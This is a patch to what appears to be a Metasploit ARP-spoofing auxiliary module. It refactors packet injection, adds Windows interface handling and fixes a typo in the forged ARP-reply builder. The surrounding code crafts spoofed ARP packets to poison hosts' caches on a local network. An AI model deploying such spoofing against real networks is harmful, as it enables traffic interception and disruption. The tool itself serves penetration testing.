@@ -79,7 +79,8 @@ class Metasploit3 < Msf::Auxiliary
 
 		begin
 			@interface = datastore['INTERFACE'] || Pcap.lookupdev
-
+			#This is needed on windows cause we send interface directly to Pcap functions
+			@interface = get_interface_guid(@interface)
 			@smac = datastore['SMAC'] 
 			@smac ||= get_mac(@interface) if @netifaces
 			raise RuntimeError ,'Source Mac should be defined' unless @smac
@@ -124,7 +125,7 @@ class Metasploit3 < Msf::Auxiliary
 								if shost != dhost
 									print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
 									reply = buildreply(shost, smac, dhost, dmac)
-									capture.inject(reply)
+									inject(reply)
 									Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
 								end
 							end
@@ -133,7 +134,7 @@ class Metasploit3 < Msf::Auxiliary
 								if shost != dhost
 									print_status("Sending arp request for #{shost} to #{dhost}") if datastore['VERBOSE']
 									request = buildprobe(dhost, dmac, shost)
-									capture.inject(request)
+									inject(request)
 									Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
 								end
 							end
@@ -147,7 +148,7 @@ class Metasploit3 < Msf::Auxiliary
 								if shost != dhost
 									print_status("Sending arp packet for #{dhost} to #{shost}") if datastore['VERBOSE']
 									reply = buildreply(dhost, dmac, shost, smac)
-									capture.inject(reply)
+									inject(reply)
 									Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
 								end
 							end
@@ -165,7 +166,7 @@ class Metasploit3 < Msf::Auxiliary
 			@shosts.each do |shost|
 				print_status("Sending arp packet for #{shost} address") if datastore['VERBOSE']
 				reply = buildreply(shost, @smac, '0.0.0.0', 'ff:ff:ff:ff:ff:ff')
-				capture.inject(reply)
+				inject(reply)
 				Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
 			end
 		end
@@ -186,7 +187,7 @@ class Metasploit3 < Msf::Auxiliary
 				print_status("Sending arp packet to #{dhost}")
 			end
 			probe = buildprobe(@sip, lsmac, dhost)
-			capture.inject(probe)
+			inject(probe)
 			while(reply = getreply())
 				next if not reply.is_arp?
 				#Without this check any arp request would be added to the cache
@@ -228,7 +229,7 @@ class Metasploit3 < Msf::Auxiliary
 					print_status("Sending arp packet to #{shost}")
 				end
 				probe = buildprobe(@sip, lsmac, shost)
-				capture.inject(probe)
+				inject(probe)
 				while(reply = getreply())
 					next if not reply.is_arp?
 					if @shosts.include? reply.arp_saddr_ip
@@ -289,7 +290,7 @@ class Metasploit3 < Msf::Auxiliary
 						if shost != dhost
 							print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
 							reply = buildreply(shost, @smac, dhost, dmac)
-							capture.inject(reply)
+							inject(reply)
 							Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
 						end
 					end
@@ -298,7 +299,7 @@ class Metasploit3 < Msf::Auxiliary
 						if shost != dhost
 							print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
 							reply = buildreply(shost, @smac, dhost, dmac)
-							capture.inject(reply)
+							inject(reply)
 							Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
 						end
 					end
@@ -313,7 +314,7 @@ class Metasploit3 < Msf::Auxiliary
 						if shost != dhost
 							print_status("Sending arp packet for #{dhost} to #{shost}") if datastore['VERBOSE']
 							reply = buildreply(dhost, @smac, shost, smac)
-							capture.inject(reply)
+							inject(reply)
 							Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
 						end
 					end
@@ -347,8 +348,8 @@ class Metasploit3 < Msf::Auxiliary
 
 	def buildreply(shost, smac, dhost, dmac)
 		p = PacketFu::ARPPacket.new
-		n.eth_saddr = smac
-		n.eth_daddr = dmac
+		p.eth_saddr = smac
+		p.eth_daddr = dmac
 		p.arp_opcode = 2 # ARP Reply
 		p.arp_daddr_mac = p.eth_daddr
 		p.arp_saddr_mac = p.eth_saddr
